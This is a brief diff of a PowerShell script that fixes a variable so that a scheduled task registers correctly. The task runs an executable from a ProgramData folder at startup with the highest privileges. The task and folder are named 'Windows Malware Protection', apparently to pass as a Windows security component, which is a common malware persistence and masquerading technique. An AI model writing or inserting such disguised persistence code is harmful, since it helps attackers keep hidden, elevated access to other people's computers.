@@ -26,4 +26,4 @@ $triggers = @()
 $triggers += New-JobTrigger -AtStartup
 $triggers += New-JobTrigger -Once -At (Get-Date).AddMinutes(1)
 $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
-Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -User $Username -Password $Password -TaskName "Windows Malware Protection"
+Register-ScheduledTask -Action $action -Trigger $triggers -RunLevel Highest -User $Username -Password $Password -TaskName "Windows Malware Protection"
